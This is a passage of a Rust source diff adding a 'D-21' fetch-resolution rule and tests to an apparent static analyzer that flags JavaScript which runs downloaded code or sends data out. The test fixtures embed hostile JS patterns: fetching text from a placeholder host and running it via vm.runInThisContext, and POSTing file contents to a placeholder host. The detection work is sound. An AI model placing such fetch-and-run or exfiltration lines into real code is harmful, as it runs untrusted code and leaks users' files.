@@ -796,6 +796,297 @@ pub(super) fn collected_members(a: &Ast) -> HashSet<PyStr> {
     out
 }
 
+/// D-21: what a module writes or defines by name, as written (`defined`). The platform's fetch is read for a call
+/// only where nothing here could put a function of the script's there (`Defined::may_write`).
+#[derive(Default)]
+pub struct Defined {
+    /// the member names it writes or defines: a member assigned with a constant key (`o.fetch = …`, `o['fetch'] =
+    /// …`, a destructuring's target), an object literal's key (a property, a method, a shorthand), a class's field
+    members: HashSet<PyStr>,
+    /// the strings it writes as constants (a literal, a template with no hole), but an operand of `in` or of a
+    /// comparison, a feature test (`'fetch' in globalThis`): `Object.defineProperty(o, 'fetch', …)`, `Reflect.set(o,
+    /// 'fetch', f)`, `Object.fromEntries([['fetch', f]])`, `const k = 'fetch'`
+    strings: HashSet<PyStr>,
+    /// the names it assigns as variables (`fetch = f`, `({ fetch } = o)`)
+    assigned: HashSet<PyStr>,
+    /// a member of the global object written by a key that is no constant (`globalThis[k] = f`, through a name given
+    /// the global object once), or the global object given Object.assign, Object.defineProperty(ies), Reflect.set,
+    /// Object.setPrototypeOf, `__defineGetter__` …
+    global_written: bool,
+    /// code it does not hold: code made from text (`eval`, `Function`, `x.constructor(…)`, a timer given a string),
+    /// a module other than Node's own required or imported
+    unseen: bool,
+}
+
+impl Defined {
+    /// Could the module put something of its own under `name`: a member of that name (with `global`, the global
+    /// object's, or a variable of that name), or anything (`__proto__` written, code it does not hold)?
+    pub(crate) fn may_write(&self, name: &[u32], global: bool) -> bool {
+        let proto: PyStr = "__proto__".chars().map(|c| c as u32).collect();
+        self.unseen
+            || self.members.contains(name)
+            || self.strings.contains(name)
+            || self.members.contains(&proto)
+            || self.strings.contains(&proto)
+            || (global && (self.global_written || self.assigned.contains(name)))
+    }
+}
+
+/// A node's text when it is a constant string: a string literal, a template with no hole.
+fn const_text(a: &Ast, n: NodeId) -> Option<PyStr> {
+    if let Some(v) = a.str_value(n) {
+        return Some(v.to_vec());
+    }
+    if a.kind(n) == Kind::TemplateLiteral && a.list(n, jt::B).is_empty() {
+        return Some(a.list(n, jt::A).first().map(|&q| a.s(q, jt::A).to_vec()).unwrap_or_default());
+    }
+    None
+}
+
+/// A member expression's or a property's key when it is a constant (`o.k`, `o['k']`, `` o[`k`] ``, `{ k: … }`,
+/// `{ ['k']: … }`).
+fn const_key(a: &Ast, n: NodeId) -> Option<PyStr> {
+    if a.kind(n) == Kind::MemberExpression {
+        if let Some(k) = a.prop_name(n) {
+            return Some(k);
+        }
+        return if a.computed(n) { const_text(a, a.at(n, jt::B)) } else { None };
+    }
+    if a.computed(n) {
+        return const_text(a, a.at(n, jt::A));
+    }
+    a.key_name(n)
+}
+
+const GLOBAL_NAMES: &[&str] = &["globalThis", "window", "self", "global"];
+
+/// D-21: may an expression be the global object: `globalThis`, `window`, `self` or `global` (a name no declaration
+/// binds), a member of one of those names (`window.self`), `this` outside a function, or a name given one of those
+/// once (`const g = typeof globalThis !== 'undefined' ? globalThis : window`)?
+fn global_ish(prog: &Program, m: ModId, node: NodeId, in_fn: bool, depth: u32) -> bool {
+    if depth > 8 || node == NONE {
+        return false;
+    }
+    let a = Ast(&prog.mods[m as usize].tree);
+    let node = a.unwrap(node);
+    match a.kind(node) {
+        Kind::ThisExpression => !in_fn,
+        Kind::Identifier => {
+            let b = prog.mods[m as usize].bind_at[node as usize];
+            if b == GLOBAL || b == UNSET {
+                return is_one(a.name(node), GLOBAL_NAMES);
+            }
+            let bind = &prog.binds[b as usize];
+            let writes: Vec<&Write> = bind.writes.iter().filter(|w| !matches!(w, Write::Nothing { .. })).collect();
+            match writes.as_slice() {
+                // (`this` in what a name is given: read as the global object's, wherever it is)
+                [Write::Init { node: v, path, .. }] | [Write::Assign { node: v, path, .. }] if path.is_empty() && bind.module == m => {
+                    global_ish(prog, m, *v, false, depth + 1)
+                }
+                _ => false,
+            }
+        }
+        Kind::MemberExpression => !a.computed(node) && a.prop_name(node).is_some_and(|n| is_one(&n, GLOBAL_NAMES)),
+        Kind::ConditionalExpression => {
+            global_ish(prog, m, a.at(node, jt::B), in_fn, depth + 1) || global_ish(prog, m, a.at(node, jt::C), in_fn, depth + 1)
+        }
+        Kind::LogicalExpression => {
+            global_ish(prog, m, a.at(node, jt::A), in_fn, depth + 1) || global_ish(prog, m, a.at(node, jt::B), in_fn, depth + 1)
+        }
+        Kind::SequenceExpression => a.list(node, jt::A).last().is_some_and(|&l| global_ish(prog, m, l, in_fn, depth + 1)),
+        Kind::AssignmentExpression => global_ish(prog, m, a.at(node, jt::B), in_fn, depth + 1),
+        _ => false,
+    }
+}
+
+/// Is a module specifier Node's own module (`fs`, `node:https`)?
+fn builtin_spec(spec: &[u32]) -> bool {
+    let bare = if spec.len() > 5 && eq(&spec[..5], "node:") { &spec[5..] } else { spec };
+    let head = bare.split(|&c| c == 0x2F).next().unwrap_or(&[]);
+    is_in(NODE_BUILTINS, head)
+}
+
+/// D-21: what module `m` writes or defines by name (Defined), read once over its tree.
+pub(crate) fn defined(prog: &Program, m: ModId) -> Defined {
+    let tree = &prog.mods[m as usize].tree;
+    let a = Ast(tree);
+    let mut d = Defined::default();
+    if tree.root == NONE {
+        return d;
+    }
+    let mut tested: HashSet<NodeId> = HashSet::new();
+    let member_write = |d: &mut Defined, target: NodeId, in_fn: bool| match const_key(&a, target) {
+        Some(k) => {
+            d.members.insert(k);
+        }
+        None => {
+            if global_ish(prog, m, a.at(target, jt::A), in_fn, 0) {
+                d.global_written = true;
+            }
+        }
+    };
+    let loaded = |d: &mut Defined, spec: NodeId| {
+        if !const_text(&a, spec).is_some_and(|s| builtin_spec(&s)) {
+            d.unseen = true;
+        }
+    };
+    // (node, inside a function with a `this` of its own, its parent)
+    let mut stack: Vec<(NodeId, bool, NodeId)> = vec![(tree.root, false, NONE)];
+    while let Some((id, in_fn, parent)) = stack.pop() {
+        let kind = a.kind(id);
+        let inner = in_fn || matches!(kind, Kind::FunctionDeclaration | Kind::FunctionExpression);
+        match kind {
+            Kind::Literal | Kind::TemplateLiteral if !tested.contains(&id) => {
+                if let Some(s) = const_text(&a, id) {
+                    d.strings.insert(s);
+                }
+            }
+            Kind::BinaryExpression if matches!(a.operator(id), "in" | "==" | "===" | "!=" | "!==") => {
+                tested.insert(a.unwrap(a.at(id, jt::A)));
+                tested.insert(a.unwrap(a.at(id, jt::B)));
+            }
+            Kind::AssignmentExpression => {
+                let left = a.unwrap(a.at(id, jt::A));
+                match a.kind(left) {
+                    Kind::MemberExpression => member_write(&mut d, left, in_fn),
+                    Kind::Identifier => {
+                        d.assigned.insert(a.name(left).to_vec());
+                    }
+                    _ => {
+                        for (n, _) in a.pattern_names(left) {
+                            d.assigned.insert(a.name(n).to_vec());
+                        }
+                        for t in a.pattern_members(left) {
+                            member_write(&mut d, a.unwrap(t), in_fn);
+                        }
+                    }
+                }
+            }
+            Kind::ObjectExpression => {
+                for &p in a.list(id, jt::A) {
+                    if a.kind(p) == Kind::Property {
+                        d.members.extend(const_key(&a, p));
+                    }
+                }
+            }
+            Kind::PropertyDefinition => d.members.extend(const_key(&a, id)),
+            Kind::CallExpression | Kind::NewExpression => {
+                let callee = a.unwrap(a.at(id, jt::A));
+                let args = a.list(id, jt::B);
+                if a.is_ident_named(callee, "eval") || a.is_ident_named(callee, "Function") {
+                    d.unseen = true;
+                }
+                if (a.is_ident_named(callee, "setTimeout") || a.is_ident_named(callee, "setInterval"))
+                    && args.first().is_some_and(|&f| !a.is_function(f))
+                {
+                    d.unseen = true;
+                }
+                if kind == Kind::CallExpression && a.is_ident_named(callee, "require") {
+                    match args.first() {
+                        Some(&spec) => loaded(&mut d, spec),
+                        None => d.unseen = true,
+                    }
+                }
+                if a.kind(callee) == Kind::MemberExpression {
+                    if let Some(name) = a.prop_name(callee) {
+                        if eq(&name, "constructor") {
+                            d.unseen = true;
+                        }
+                        let target = if is_one(&name, &["__defineGetter__", "__defineSetter__"]) {
+                            Some(a.at(callee, jt::A))
+                        } else if is_one(
+                            &name,
+                            &["assign", "defineProperty", "defineProperties", "setPrototypeOf", "set", "__proto__"],
+                        ) {
+                            args.first().copied()
+                        } else {
+                            None
+                        };
+                        if target.is_some_and(|t| global_ish(prog, m, t, in_fn, 0)) {
+                            d.global_written = true;
+                        }
+                    }
+                }
+            }
+            Kind::ImportExpression => loaded(&mut d, a.at(id, jt::A)),
+            Kind::ImportDeclaration | Kind::ExportAllDeclaration => loaded(&mut d, a.at(id, jt::B)),
+            Kind::ExportNamedDeclaration if a.at(id, jt::C) != NONE => loaded(&mut d, a.at(id, jt::C)),
+            // (`eval` or `Function` as a value, `eval.call(…)`; not `Function.prototype`)
+            Kind::Identifier if a.is_ident_named(id, "eval") || a.is_ident_named(id, "Function") => {
+                let proto = parent != NONE
+                    && a.kind(parent) == Kind::MemberExpression
+                    && a.at(parent, jt::A) == id
+                    && a.prop_name(parent).is_some_and(|n| eq(&n, "prototype"));
+                if !proto {
+                    d.unseen = true;
+                }
+            }
+            _ => {}
+        }
+        for c in a.kids(id).into_iter().rev() {
+            stack.push((c, inner, id));
+        }
+    }
+    d
+}
+
+/// Where a parameter's pattern `pat` declares `ident`: the members the name is taken from (`{ customFetch }` gives
+/// `[Some("customFetch")]`, a plain parameter none) and the default it is given itself (`customFetch = f`), if any.
+fn param_place(a: &Ast, pat: NodeId, ident: NodeId) -> Option<(Path, NodeId)> {
+    let mut stack: Vec<(NodeId, Path, NodeId)> = vec![(pat, Vec::new(), NONE)];
+    while let Some((p, path, default)) = stack.pop() {
+        if p == NONE {
+            continue;
+        }
+        match a.kind(p) {
+            Kind::Identifier if p == ident => return Some((path, default)),
+            Kind::AssignmentPattern => {
+                // (a pattern's own default, `{ a } = {}`, is not the name's)
+                let left = a.at(p, jt::A);
+                let own = if a.kind(left) == Kind::Identifier { a.at(p, jt::B) } else { NONE };
+                stack.push((left, path, own));
+            }
+            Kind::ObjectPattern => {
+                for &prop in a.list(p, jt::A) {
+                    let mut q = path.clone();
+                    if a.kind(prop) == Kind::RestElement {
+                        q.push(None);
+                        stack.push((a.at(prop, jt::A), q, NONE));
+                    } else {
+                        q.push(if a.computed(prop) { None } else { a.key_name(prop) });
+                        stack.push((a.at(prop, jt::B), q, NONE));
+                    }
+                }
+            }
+            Kind::ArrayPattern => {
+                for &el in a.list(p, jt::A) {
+                    let mut q = path.clone();
+                    q.push(None);
+                    stack.push((el, q, NONE));
+                }
+            }
+            Kind::RestElement => {
+                let mut q = path;
+                q.push(None);
+                stack.push((a.at(p, jt::A), q, NONE));
+            }
+            _ => {}
+        }
+    }
+    None
+}
+
+/// Where a parameter's name is declared (Eval::sc_param_of): its binding, the scope of its function, its position,
+/// the members it is taken from, its own default and its destructuring's (D-21).
+struct ParamAt {
+    bind: BindId,
+    pscope: ScopeId,
+    index: usize,
+    path: Path,
+    own_default: NodeId,
+    pat_default: NodeId,
+}
+
 fn dotted2<'a>(a: &'a str, b: &'a [&'a str]) -> impl Fn(&[u32]) -> bool + 'a {
     move |name: &[u32]| b.iter().any(|m| eq_dotted(name, a, m))
 }
@@ -1980,6 +2271,321 @@ impl<'p> Eval<'p> {
         }
         let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
         Some(self.sc_source(K_RECEIVED, u("a download"), at, line, 0))
+    }
+
+    /// D-21: local checks for a possible platform fetch. These do not describe startup:
+    /// a preload, NODE_OPTIONS, an earlier script or another package file may replace fetch.
+    /// Keep the existing return/argument reading even when these checks pass. Received
+    /// data and callback propagation are additional possibilities, never a clearance.
+    fn sc_platform_call(&mut self, node: NodeId, callee: NodeId, scope: ScopeId, fids: &[FnId]) -> bool {
+        let key = (self.m, node);
+        if let Some(&hit) = self.p.sc_platform.get(&key) {
+            return hit;
+        }
+        let m = self.m;
+        let got = !self.p.mods[m as usize].eval_with
+            && self.sc_platform_fetch(callee, scope, 0)
+            && !self.sc_defined().may_write(&u("fetch"), true)
+            && {
+                let dead = self.sc_dead_classes();
+                fids.iter().all(|&f| {
+                    let fun = &self.p.fns[f as usize];
+                    fun.module == m && fun.cls.is_some_and(|c| dead.contains(&c))
+                })
+            };
+        self.p.sc_platform.insert(key, got);
+        got
+    }
+
+    /// D-21: is a callee the platform's fetch: `fetch` (a name no declaration binds), `globalThis.fetch` (window's,
+    /// self's, global's), a name given one of those once, or a fallback from a locally absent value
+    /// (`customFetch ?? fetch`, `opts.fetch || globalThis.fetch`: sc_given_fetch)?
+    fn sc_platform_fetch(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
+        if depth > 8 || node == NONE {
+            return false;
+        }
+        let node = self.a().unwrap(node);
+        match self.a().kind(node) {
+            Kind::Identifier => {
+                let Some(b) = self.bind(node, scope) else { return eq(self.a().name(node), "fetch") };
+                let bind = &self.p.binds[b as usize];
+                let writes: Vec<Write> = bind.writes.iter().filter(|w| !matches!(w, Write::Nothing { .. })).cloned().collect();
+                if bind.module != self.m || writes.len() != 1 {
+                    return false;
+                }
+                match &writes[0] {
+                    Write::Init { node: v, scope: s, path } | Write::Assign { node: v, scope: s, path } if path.is_empty() => {
+                        self.sc_platform_fetch(*v, *s, depth + 1)
+                    }
+                    _ => false,
+                }
+            }
+            Kind::MemberExpression => {
+                let obj = {
+                    let a = self.a();
+                    let obj = a.unwrap(a.at(node, jt::A));
+                    let global = a.kind(obj) == Kind::Identifier && is_one(a.name(obj), GLOBAL_NAMES);
+                    if !global || !a.prop_name(node).is_some_and(|n| eq(&n, "fetch")) {
+                        return false;
+                    }
+                    obj
+                };
+                self.bind(obj, scope).is_none()
+            }
+            Kind::LogicalExpression if matches!(self.a().operator(node), "??" | "||") => {
+                let (left, right) = (self.a().at(node, jt::A), self.a().at(node, jt::B));
+                self.sc_platform_fetch(right, scope, depth + 1) && self.sc_given_fetch(left, scope, depth + 1)
+            }
+            _ => false,
+        }
+    }
+
+    /// D-21: what a fallback falls back from, absent in the local call sites: a parameter no call of its
+    /// function gives anything, with no default of the code's own (`customFetch`, `customFetch = undefined`:
+    /// sc_not_given); a field of a parameter, or a name destructured from one (`opts.fetch`, `opts?.fetch`, `{
+    /// customFetch } = {}`), where each call gives nothing, `undefined`, `null` or an object literal without that key,
+    /// the default is one of those, the parameter is read only for its members, and the module writes no member of
+    /// that name (Defined::may_write); or a fallback of those (`a ?? b ?? fetch`).
+    fn sc_given_fetch(&mut self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
+        if depth > 8 || node == NONE {
+            return false;
+        }
+        let node = self.a().unwrap(node);
+        match self.a().kind(node) {
+            Kind::Identifier => {
+                let Some(pp) = self.sc_param_of(node, scope) else { return false };
+                if pp.own_default != NONE && !self.sc_nullish(pp.own_default) && !self.sc_platform_fetch(pp.own_default, pp.pscope, depth + 1) {
+                    return false;
+                }
+                match pp.path.as_slice() {
+                    [] => self.sc_not_given(&pp, None),
+                    [Some(field)] => {
+                        let field = field.clone();
+                        self.sc_lacks(pp.pat_default, &field)
+                            && !self.sc_defined().may_write(&field, false)
+                            && self.sc_not_given(&pp, Some(&field))
+                    }
+                    _ => false,
+                }
+            }
+            Kind::MemberExpression => {
+                let (obj, field) = {
+                    let a = self.a();
+                    (a.unwrap(a.at(node, jt::A)), const_key(&a, node))
+                };
+                let Some(field) = field else { return false };
+                if self.a().kind(obj) != Kind::Identifier {
+                    return false;
+                }
+                let Some(pp) = self.sc_param_of(obj, scope) else { return false };
+                pp.path.is_empty()
+                    && self.sc_lacks(pp.own_default, &field)
+                    && self.sc_read_for_members(pp.bind)
+                    && !self.sc_defined().may_write(&field, false)
+                    && self.sc_not_given(&pp, Some(&field))
+            }
+            Kind::LogicalExpression if matches!(self.a().operator(node), "??" | "||") => {
+                let (left, right) = (self.a().at(node, jt::A), self.a().at(node, jt::B));
+                self.sc_given_fetch(left, scope, depth + 1) && self.sc_given_fetch(right, scope, depth + 1)
+            }
+            _ => false,
+        }
+    }
+
+    /// A name that is a parameter alone (its one write): where its pattern declares it (param_place).
+    fn sc_param_of(&self, ident: NodeId, scope: ScopeId) -> Option<ParamAt> {
+        let b = self.bind(ident, scope)?;
+        let bind = &self.p.binds[b as usize];
+        if bind.module != self.m || bind.writes.len() != 1 {
+            return None;
+        }
+        let Write::Param { node: pat, scope: pscope, index } = bind.writes[0] else { return None };
+        // (the name's own declaration: the identifier the pattern binds of that name)
+        let a = self.a();
+        let decl = a.pattern_names(pat).into_iter().map(|(n, _)| n).find(|&n| a.name(n) == bind.name.as_slice())?;
+        let (path, own_default) = param_place(&a, pat, decl)?;
+        // (a destructuring's own default, `{ customFetch } = {}`)
+        let pat_default =
+            if a.kind(pat) == Kind::AssignmentPattern && a.kind(a.at(pat, jt::A)) != Kind::Identifier { a.at(pat, jt::B) } else { NONE };
+        Some(ParamAt { bind: b, pscope, index, path, own_default, pat_default })
+    }
+
+    /// `undefined` (a name no declaration binds), `null`, `void …`.
+    fn sc_nullish(&self, n: NodeId) -> bool {
+        let a = self.a();
+        let n = a.unwrap(n);
+        match a.kind(n) {
+            Kind::Identifier => eq(a.name(n), "undefined") && self.p.mods[self.m as usize].bind_at[n as usize] == GLOBAL,
+            Kind::Literal => a.op(n) == jt::L_NULL,
+            Kind::UnaryExpression => a.operator(n) == "void",
+            _ => false,
+        }
+    }
+
+    /// Does a value hold no member `field`: nothing (NONE), nullish, or an object literal whose keys are all
+    /// constants, none of them `field` or `__proto__`, with no spread?
+    fn sc_lacks(&self, n: NodeId, field: &[u32]) -> bool {
+        if n == NONE || self.sc_nullish(n) {
+            return true;
+        }
+        let a = self.a();
+        let n = a.unwrap(n);
+        a.kind(n) == Kind::ObjectExpression
+            && a.list(n, jt::A).iter().all(|&p| {
+                a.kind(p) == Kind::Property && const_key(&a, p).is_some_and(|k| k.as_slice() != field && !eq(&k, "__proto__"))
+            })
+    }
+
+    /// Is a parameter read only for its members by constant keys (`opts.fetch`, `opts?.x`), never handed on or
+    /// written by a key that is no constant?
+    fn sc_read_for_members(&self, b: BindId) -> bool {
+        let a = self.a();
+        self.p.binds[b as usize].refs.iter().all(|&(ident, parent)| {
+            parent != NONE && a.kind(parent) == Kind::MemberExpression && a.at(parent, jt::A) == ident && const_key(&a, parent).is_some()
+        })
+    }
+
+    /// D-21: is a parameter (or, with `field`, that member of it) given nothing by any call: its function is bound
+    /// to a name (a declaration; `const f = function|arrow`), exported nowhere and read only as the callee of a call,
+    /// and every call gives its position nothing, `undefined`, `null`, `void …`, or, with a field, an object literal
+    /// without that key (sc_lacks), and no spread before it?
+    fn sc_not_given(&mut self, pp: &ParamAt, field: Option<&[u32]>) -> bool {
+        let m = self.m;
+        let f = self.p.scopes[pp.pscope as usize].fid;
+        let (fmod, fnode) = (self.p.fns[f as usize].module, self.p.fns[f as usize].node);
+        let fkind = self.a().kind(fnode);
+        if fmod != m || !matches!(fkind, Kind::FunctionDeclaration | Kind::FunctionExpression | Kind::ArrowFunctionExpression) {
+            return false;
+        }
+        // Index bindings once, rather than rescanning every binding for every helper.
+        if !self.p.sc_function_names.contains_key(&m) {
+            let mut index: HashMap<NodeId, (Vec<BindId>, bool)> = HashMap::new();
+            for (b, bind) in self.p.binds.iter().enumerate() {
+                if bind.module != m { continue; }
+                for w in &bind.writes {
+                    let (node, outer) = match w {
+                        Write::Fn { fid, .. } => {
+                            let fun = &self.p.fns[*fid as usize];
+                            if fun.module != m { continue; }
+                            (fun.node, self.a().kind(fun.node) == Kind::FunctionDeclaration)
+                        }
+                        Write::Init { node, path, .. } if path.is_empty() => (*node, true),
+                        _ => continue,
+                    };
+                    let entry = index.entry(node).or_default();
+                    entry.0.push(b as BindId);
+                    entry.1 |= outer;
+                }
+            }
+            self.p.sc_function_names.insert(m, Rc::new(index));
+        }
+        let index = self.p.sc_function_names[&m].clone();
+        let Some((names, outer)) = index.get(&fnode) else { return false };
+        if !*outer {
+            return false;
+        }
+        // (exported: by a name, or the function itself)
+        let md = &self.p.mods[m as usize];
+        let exported_node = md.named.values().flatten().any(|e| matches!(e, Export::Expr { node, .. } if *node == fnode))
+            || md.cjs.iter().any(|&(n, _)| n == fnode)
+            || md.cjs_props.values().flatten().any(|&(n, _)| n == fnode);
+        if exported_node {
+            return false;
+        }
+        let exports: Vec<(PyStr, ScopeId)> = md
+            .named
+            .values()
+            .flatten()
+            .filter_map(|e| match e {
+                Export::Binding { name, scope } => Some((name.clone(), *scope)),
+                _ => None,
+            })
+            .collect();
+        for &b in names {
+            if self.p.binds[b as usize].writes.len() != 1 || exports.iter().any(|(n, s)| self.p.lookup(*s, n) == Some(b)) {
+                return false;
+            }
+            let a = self.a();
+            let ok = self.p.binds[b as usize].refs.iter().all(|&(ident, parent)| {
+                if parent == NONE || a.kind(parent) != Kind::CallExpression || a.unwrap(a.at(parent, jt::A)) != ident {
+                    return false;
+                }
+                let args = a.list(parent, jt::B);
+                if args.iter().take(pp.index + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
+                    return false;
+                }
+                match args.get(pp.index) {
+                    None => true,
+                    Some(&arg) => self.sc_nullish(arg) || field.is_some_and(|fd| self.sc_lacks(arg, fd)),
+                }
+            });
+            if !ok {
+                return false;
+            }
+        }
+        true
+    }
+
+    /// What the module writes or defines by name (`defined`), read once.
+    fn sc_defined(&mut self) -> Rc<Defined> {
+        let m = self.m;
+        if let Some(d) = self.p.sc_defined.get(&m) {
+            return d.clone();
+        }
+        let d = Rc::new(defined(self.p, m));
+        self.p.sc_defined.insert(m, d.clone());
+        d
+    }
+
+    /// D-21: the module's classes no code reaches: a class declaration whose name is never referenced nor exported,
+    /// written once, with no decorator, no static block, no static field given a value and no computed key (what
+    /// runs where it is defined, and could hand on the class). Its methods can be no call's callee.
+    fn sc_dead_classes(&mut self) -> Rc<HashSet<ClassId>> {
+        let m = self.m;
+        if let Some(d) = self.p.sc_dead.get(&m) {
+            return d.clone();
+        }
+        let md = &self.p.mods[m as usize];
+        let a = Ast(&md.tree);
+        let exports: Vec<(PyStr, ScopeId)> = md
+            .named
+            .values()
+            .flatten()
+            .filter_map(|e| match e {
+                Export::Binding { name, scope } => Some((name.clone(), *scope)),
+                _ => None,
+            })
+            .collect();
+        let mut dead = HashSet::new();
+        for (b, bind) in self.p.binds.iter().enumerate() {
+            let [Write::Class { node, cid, .. }] = bind.writes.as_slice() else { continue };
+            if bind.module != m || !bind.refs.is_empty() || a.kind(*node) != Kind::ClassDeclaration {
+                continue;
+            }
+            if exports.iter().any(|(n, s)| self.p.lookup(*s, n) == Some(b as BindId))
+                || md.named.values().flatten().any(|e| matches!(e, Export::Expr { node: x, .. } if x == node))
+            {
+                continue;
+            }
+            let decorated = |n: NodeId| a.at(n, jt::D) != NONE && !a.list(n, jt::D).is_empty();
+            if decorated(*node) {
+                continue;
+            }
+            let body = a.at(*node, jt::C);
+            let quiet = a.list(body, jt::A).iter().all(|&mem| {
+                let k = a.kind(mem);
+                k != Kind::StaticBlock
+                    && !a.computed(mem)
+                    && !decorated(mem)
+                    && !(k == Kind::PropertyDefinition && a.flag(mem, jt::STATIC) && a.opt(mem, jt::B).is_some())
+            });
+            if quiet {
+                dead.insert(*cid);
+            }
+        }
+        let dead = Rc::new(dead);
+        self.p.sc_dead.insert(m, dead.clone());
+        dead
     }
 
     /// `process.env.NAME` (and `process.env['NAME']`): a binding the model
@@ -3511,7 +4117,10 @@ impl<'p> Eval<'p> {
         let (fids, how) = (tg.0.clone(), tg.1);
         let definite = how == descs::How::Definite;
         let line = self.call_line(node);
-        if fids.is_empty() && !member {
+        // D-21: local fetch checks add parameter/callback propagation. They do not
+        // clear possible local returns: this reader has no closed startup context.
+        let platform = receiving && how == descs::How::Open && self.sc_platform_call(node, callee, scope, &fids);
+        if (fids.is_empty() || platform) && !member {
             self.sc_param_called(callee_val, args, spread);
         }
         // (a method of its own, called on a parameter: that member of the parameter, D-16: prisma's
@@ -3544,6 +4153,8 @@ impl<'p> Eval<'p> {
                 v = v.union(&given).union(&recv.plain());
                 self.member_write(callee, &given, scope);
             }
+            // A locally eligible fetch can still have been replaced before this file ran.
+            // Preserve v, including the old argument and name-target return reading.
         } else if name.as_deref().is_some_and(|n| is_in(CLEAN_RESULT, n)) {
             v = V::empty();
         } else if receiving {
@@ -4710,6 +5321,114 @@ mod tests {
         assert_eq!(sent(&load("/app-config")), None);
         assert_eq!(sent(&load("/data.json")), None);
         assert_eq!(sent(&load("/home-page")), None);
+    }
+
+    #[test]
+    fn fetch_local_checks_run_without_clearing_unknown_startup() {
+        let text = u("class Store { fetch(k) { return k; } }\nfunction load(customFetch) { const f = customFetch ?? fetch; return f('https://files.invalid/p').then(r => r.text()).then(t => require('vm').runInThisContext(t)); } load();");
+        let sup = Rc::new(Supply::new(crate::pack::current(), &text));
+        let mut cfg = Config::new(&[], &[], &[], &[]);
+        cfg.supply = Some(sup.clone());
+        let mut prog = Program::new(Rc::new(cfg));
+        prog.add_module(&u("script.js"), supply_tree(&text, Dialect::Js).unwrap(), 0);
+        prog.resolve_module(0);
+        *sup.outside.borrow_mut() = outside_names(&prog, &sup);
+        let mut findings = Vec::new();
+        fixpoint(&mut prog, &mut findings);
+        assert!(prog.sc_platform.values().any(|&v| v), "must exercise D-21 eligibility, not the eval fallback");
+        assert!(findings.iter().any(|f| matches!(f, Out::Received { .. })));
+        assert_eq!(prog.sc_function_names.len(), 1);
+    }
+
+    #[test]
+    fn a_fallback_to_fetch_from_a_parameter_returns_what_it_receives() {
+        // D-21: the platform's `fetch`, and a helper's `customFetch ?? fetch` (inspect-ai's view), were found by name
+        // to be any function of the script's called `fetch` too (a class's method), so the call returned what it was
+        // given: a route under a system folder (`/data/…`) was a path, and a reader given the response a file read.
+        // Reworked after an independent review: the local checks cannot rule out startup replacements.
+        let post = format!("fetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
+        let store = "class Store { fetch(k) { return k; } }\n";
+        let helper = |sig: &str, pick: &str, call: &str| {
+            format!(
+                "async function get(u, {}) {{\n  const fetchFn = {};\n  const r = await fetchFn(u);\n  return r.text();\n}}\n\
+                 async function go(reader) {{\n  const body = await {};\n  const v = await reader.readFile(body);\n  {}}}\n\
+                 go(globalThis.zip);\n",
+                sig, pick, call, post
+            )
+        };
+        let route = "get('/data/list')";
+        // Local checks: no call gives the parameter anything, nothing in the file writes a fetch of its own, and the
+        // function the name finds is a method of a class nothing reaches
+        let given = [
+            ("c", "fetch"),
+            ("c", "globalThis.fetch"),
+            ("customFetch", "customFetch ?? fetch"),
+            ("customFetch", "customFetch || fetch"),
+            ("customFetch", "(customFetch) ?? window.fetch"),
+            ("customFetch = undefined", "customFetch ?? fetch"),
+            ("a, b", "a ?? b ?? fetch"),
+            ("opts", "opts.fetch ?? globalThis.fetch"),
+            ("opts = {}", "opts?.customFetch || fetch"),
+            ("{ customFetch } = {}", "customFetch ?? fetch"),
+        ];
+        for (sig, pick) in given {
+            assert_eq!(sent(&helper(sig, pick, route)), None, "{}", pick);
+            let old = if matches!(pick, "globalThis.fetch" | "(customFetch) ?? window.fetch") {
+                None // These member spellings had no file finding on the RA-6 base either.
+            } else { found("file", "/data/list") };
+            assert_eq!(sent(&format!("{}{}", store, helper(sig, pick, route))), old, "{}", pick);
+        }
+        let direct = helper("c", "fetch", route).replace("  const fetchFn = fetch;\n  const r = await fetchFn(u);\n", "  const r = await fetch(u);\n");
+        assert_eq!(sent(&format!("{}{}", store, direct)), found("file", "/data/list"));
+        // (a call that gives an options object without the field)
+        assert_eq!(sent(&format!("{}{}", store, helper("opts", "opts.fetch ?? globalThis.fetch", "get('/data/list', { retries: 2 })"))), found("file", "/data/list"));
+        // With unknown values, what was read stands (fail closed), each for the reason named. The code puts a fetch of its own
+        // on the global object: the call reaches it (the function its name finds is the one put there)
+        let file = found("file", "/data/list");
+        for install in [
+            "globalThis.fetch = (k) => k;\n",
+            "window.fetch = function (k) { return k; };\n",
+            "global.fetch = (k) => k;\n",
+            "self.fetch = (k) => k;\n",
+            "Object.assign(globalThis, { fetch: (k) => k });\n",
+            "Object.defineProperty(globalThis, 'fetch', { value: function fetch(k) { return k; } });\n",
+        ] {
+            for (sig, pick) in [("c", "fetch"), ("customFetch", "customFetch ?? fetch")] {
+                assert_eq!(sent(&format!("{}{}{}", store, install, helper(sig, pick, route))), file, "{} {}", install, pick);
+            }
+        }
+        // a call gives the options object a fetch of its own: an object literal's, a class instance's method, a
+        // class's static method, a member defined, an object made from entries
+        let opts = "opts.fetch ?? globalThis.fetch";
+        for (defs, call) in [
+            ("", "get('/data/list', { fetch: (k) => k })"),
+            ("class Src { fetch(k) { return k; } }\n", "get('/data/list', new Src())"),
+            ("class Src { static fetch(k) { return k; } }\n", "get('/data/list', Src)"),
+            ("const d = {};\nObject.defineProperty(d, 'fetch', { value: function fetch(k) { return k; } });\n", "get('/data/list', d)"),
+            ("const mine = function fetch(k) { return k; };\n", "get('/data/list', Object.fromEntries([['fetch', mine]]))"),
+        ] {
+            assert_eq!(sent(&format!("{}{}", defs, helper("opts", opts, call))), file, "{}", call);
+        }
+        // where it is not proven what the parameter or the global holds, the reading by name stands, as 01f8e6b
+        // read it (here through Store's method: the model does not follow what a parameter is given): a call gives
+        // the parameter a function, the parameter has a default of the code's own, Store is instantiated
+        let reader = "function readList(k) { return k; }\n";
+        for (defs, sig, call) in [
+            (reader, "customFetch", "get('/data/list', readList)"),
+            (reader, "customFetch = readList", route),
+            ("const s = new Store();\n", "customFetch", route),
+        ] {
+            assert_eq!(sent(&format!("{}{}{}", store, defs, helper(sig, "customFetch ?? fetch", call))), file, "{} {}", sig, call);
+        }
+        // and what the fallback receives is received
+        for pick in ["customFetch ?? fetch", "customFetch || fetch", "opts.fetch ?? globalThis.fetch"] {
+            let sig = if pick.starts_with("opts") { "opts" } else { "customFetch" };
